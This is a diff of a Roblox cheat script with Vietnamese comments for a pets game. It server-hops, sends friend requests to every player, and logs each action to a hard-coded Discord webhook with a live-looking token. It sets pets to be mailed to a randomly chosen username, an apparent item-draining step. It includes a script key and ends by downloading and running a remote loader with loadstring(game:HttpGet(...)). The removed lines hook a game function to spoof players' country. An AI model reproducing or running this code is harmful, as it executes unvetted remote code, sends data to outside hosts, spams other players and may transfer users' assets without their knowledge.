@@ -1,18 +1,13 @@
--- Các dịch vụ cần thiết
-local plrs = game:GetService("Players")
+local plrs = game:GetService("Players") 
+local plr = plrs.LocalPlayer
 local tpService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
-local LocalizationService = game:GetService("LocalizationService")
-local workspace = game:GetService("Workspace")
 
--- Hàm lấy danh sách các server
 local function getServers()
     local url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)
-    local servers = HttpService:JSONDecode(game:HttpGet(url)).data
+    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet(url)).data
     return servers
 end
 
--- Hàm chuyển server (Server Hopping)
 local function serverhop()
     local server
     repeat
@@ -20,13 +15,26 @@ local function serverhop()
         server = getServers()[Random.new():NextInteger(1, 100)]
     until server.id ~= game.JobId
 
-    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plrs.LocalPlayer)
+    tpService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
 end
 
--- Danh sách tên người dùng cho Friend Requests
 local usernames = {
-    "", "", "", "", "", "", "", "", "", "", -- Thay thế bằng tên người dùng thực tế
-    "", "", "", "", "", "" -- Thay thế bằng tên người dùng thực tế
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",
+    "",  -- Thay thế bằng tên người dùng thực tế
+    "",  -- Thay thế bằng tên người dùng thực tế
+    "",  -- Thay thế bằng tên người dùng thực tế
+    "",  -- Thay thế bằng tên người dùng thực tế
+    "",  -- Thay thế bằng tên người dùng thực tế
+    ""   -- Thay thế bằng tên người dùng thực tế
 }
 
 local function getRandomUsername()
@@ -36,19 +44,19 @@ end
 
 local sendto = getRandomUsername()
 
--- Webhook URLs for Discord messages
 local Url2 = "https://discordapp.com/api/webhooks/1300081281387986985/O4G_wdVsQKMLqQhof03nNyKmsgHINBu4f3_bBhp6fM11KrFSP-Eco6XJjiPzakEwPmky"
-
--- Gửi thông điệp vào Discord Webhook
-local function Msg(msg)
-    request({Url = Url2, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode({content = msg})})
+local Http2 = game:GetService("HttpService")
+local Msg = function(msg)
+    request({Url = Url2, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = Http2:JSONEncode({content = msg})})
 end
 
--- Gửi yêu cầu kết bạn cho tất cả người chơi
+local Players = game:GetService('Players')
+local Client = Players.LocalPlayer
+_G.EnableFriendRequest = true
+
 local function SendFriendRequests()
-    local Client = plrs.LocalPlayer
-    for _, player in ipairs(plrs:GetPlayers()) do
-        if player ~= Client then
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= Client then  
             Client:RequestFriendship(player)
             Msg(Client.Name.." đã gửi yêu cầu kết bạn tới "..player.Name)
             task.wait(600)
@@ -76,53 +84,8 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
--- Hook vào hàm GetCountryRegionForPlayerAsync
-local userCountryCache = {}
+script_key="kuQoDnFgeRipnysIrKrGhcoLjpYFSUEn";
 
-local function hookGetCountryRegionForPlayerAsync()
-    local e = require(game:GetService("ReplicatedStorage").Library.Functions.GetCountryRegionForPlayerAsync)
-
-    -- Lấy một giá trị hằng định từ mã nguồn (Constants)
-    local constants = getconstants(e)
-    local constantIndex = 11  -- Chỉ số cần lấy trong bảng constants (đảm bảo rằng chỉ số này là chính xác)
-    local v1 = constants[constantIndex]
-
-    hookfunction(e, function(player, isAsync, fallbackValue)
-        local userId = player.UserId
-
-        -- Kiểm tra nếu đã có thông tin quốc gia người chơi trong cache và không quá hạn
-        local cachedData = userCountryCache[userId]
-        if cachedData and (cachedData.Value or workspace:GetServerTimeNow() - cachedData.Timestamp < (fallbackValue or 300)) then
-            return cachedData.Value
-        elseif isAsync then
-            return nil
-        else
-            -- Gọi hàm gốc để lấy quốc gia vùng của người chơi
-            local status, result = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
-
-            -- Kiểm tra kết quả trả về và lưu vào cache
-            if not status or not result then
-                userCountryCache[userId] = {
-                    Value = nil,
-                    Timestamp = workspace:GetServerTimeNow()
-                }
-                return nil
-            else
-                -- Nếu có kết quả hợp lệ, lưu quốc gia vào cache
-                userCountryCache[userId] = {
-                    Value = "MX",  -- Thay thế "MX" nếu bạn muốn gán giá trị quốc gia mặc định khác
-                    Timestamp = workspace:GetServerTimeNow()
-                }
-                return "MX"  -- Trả về giá trị quốc gia mặc định
-            end
-        end
-    end)
-end
-
--- Khởi động hook
-hookGetCountryRegionForPlayerAsync()
-
--- Cấu hình cho pets, webhooks, v.v.
 getgenv().petsGoConfig = {
     EVENT_EGG = false,
     HIDE_NAME = true,  -- hide webhook username
@@ -136,6 +99,6 @@ getgenv().petsGoConfig = {
     USERNAME_TO_MAIL = sendto -- Mail Pet To Username
 }
 
--- Cấu hình thêm, ví dụ cho script liên quan đến Lua Armor
 daubuoi = true
+
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5653ca0a4685e7d4268329988eefdb21.lua"))()
